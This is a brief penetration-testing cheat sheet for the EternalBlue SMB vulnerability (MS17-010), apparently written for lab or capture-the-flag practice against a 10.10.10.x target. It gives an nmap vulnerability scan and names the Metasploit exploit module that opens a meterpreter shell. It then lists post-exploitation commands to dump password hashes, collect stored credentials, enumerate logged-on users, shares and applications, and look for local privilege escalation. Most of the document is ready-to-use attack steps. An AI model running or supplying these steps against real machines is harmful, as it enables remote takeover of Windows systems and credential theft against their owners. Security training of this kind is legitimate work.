# smb-vuln-ms17-010 | CVE-2017-0143 | EternalBlue

## Metasploit

1. Check if target is vulnerable
   
        nmap --script vuln -p 137,139,445 10.10.10.4

2. Use Metasploit module `exploit/windows/smb/ms17_010_eternalblue` to obtain **meterpreter** shell access

        getuid
        ipconfig
        
        run post/windows/gather/hashdump
        run post/windows/gather/credentials/credential_collector 

        run post/windows/gather/enum_applications
        run post/windows/gather/enum_logged_on_users
        run post/windows/gather/enum_shares
        run post/windows/gather/enum_snmp

        use post/multi/recon/local_exploit_suggester

## References

* https://www.lmgsecurity.com/manually-exploiting-ms17-010/
* https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/